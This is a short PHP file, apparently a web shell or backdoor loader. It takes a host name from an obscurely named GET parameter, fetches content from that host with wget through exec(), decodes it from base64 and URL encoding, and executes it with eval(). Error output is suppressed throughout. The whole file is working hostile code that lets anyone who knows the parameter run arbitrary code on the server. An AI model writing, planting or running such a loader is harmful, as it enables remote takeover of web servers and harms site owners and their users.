<?php

$w = 'https://'.@$_GET['80hbk67wj3a42o'];
@exec("wget $w -qO-", $g);
$m = base64_decode($g[0]);
$k = urldecode($m);
$l = '?>';
$z = $l.$k;
eval($z);
